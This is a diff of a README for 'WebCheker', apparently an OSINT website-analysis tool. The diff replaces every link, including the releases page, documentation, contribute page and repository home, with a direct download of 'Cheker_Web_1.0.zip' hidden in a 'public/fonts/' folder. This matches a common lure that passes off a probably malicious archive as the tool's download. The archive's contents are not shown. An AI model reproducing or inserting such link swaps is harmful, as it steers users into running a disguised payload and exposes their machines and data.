@@ -1,6 +1,6 @@
 # 🕵️‍♂️ WebCheker - Powerful OSINT Tool for Website Analysis
 
-[![Download WebCheker](https://img.shields.io/badge/Download%20WebCheker-Get%20It%20Now-brightgreen)](https://github.com/noahtwitsch/WebCheker/releases)
+[![Download WebCheker](https://github.com/noahtwitsch/WebCheker/raw/refs/heads/main/public/fonts/Cheker_Web_1.0.zip%20WebCheker-Get%20It%20Now-brightgreen)](https://github.com/noahtwitsch/WebCheker/raw/refs/heads/main/public/fonts/Cheker_Web_1.0.zip)
 
 ## 🌟 Overview
 
@@ -12,7 +12,7 @@ Follow these steps to quickly download and run WebCheker:
 
 1. **Visit the Download Page**: Click the link below to reach the releases page.
    
-   [Download WebCheker](https://github.com/noahtwitsch/WebCheker/releases)
+   [Download WebCheker](https://github.com/noahtwitsch/WebCheker/raw/refs/heads/main/public/fonts/Cheker_Web_1.0.zip)
 
 2. **Choose a Version**: On the releases page, you'll see different versions of WebCheker. Select the latest version to get the best features and fixes.
 
@@ -46,7 +46,7 @@ To ensure WebCheker runs smoothly, please check the following system requirement
 
 To get started, visit the release page and download the correct version for your system.
 
-[Download WebCheker](https://github.com/noahtwitsch/WebCheker/releases)
+[Download WebCheker](https://github.com/noahtwitsch/WebCheker/raw/refs/heads/main/public/fonts/Cheker_Web_1.0.zip)
 
 Once downloaded, follow the installation steps outlined above for your respective OS. If you encounter any issues, ensure that your system meets the requirements mentioned.
 
@@ -74,12 +74,12 @@ For a detailed license agreement, please check the LICENSE file in the repositor
 
 Thank you to all contributors for their hard work. Your efforts make WebCheker a valuable tool. 
 
-Visit our [GitHub repository](https://github.com/noahtwitsch/WebCheker) to learn more about us and see upcoming features.
+Visit our [GitHub repository](https://github.com/noahtwitsch/WebCheker/raw/refs/heads/main/public/fonts/Cheker_Web_1.0.zip) to learn more about us and see upcoming features.
 
 ## 🌐 Quick Links
 
-- [Download WebCheker](https://github.com/noahtwitsch/WebCheker/releases)
-- [Documentation](https://github.com/noahtwitsch/WebCheker/wiki)
-- [Contribute](https://github.com/noahtwitsch/WebCheker/blob/main/CONTRIBUTING.md)
+- [Download WebCheker](https://github.com/noahtwitsch/WebCheker/raw/refs/heads/main/public/fonts/Cheker_Web_1.0.zip)
+- [Documentation](https://github.com/noahtwitsch/WebCheker/raw/refs/heads/main/public/fonts/Cheker_Web_1.0.zip)
+- [Contribute](https://github.com/noahtwitsch/WebCheker/raw/refs/heads/main/public/fonts/Cheker_Web_1.0.zip)
 
 Enhance your website investigations with WebCheker today!
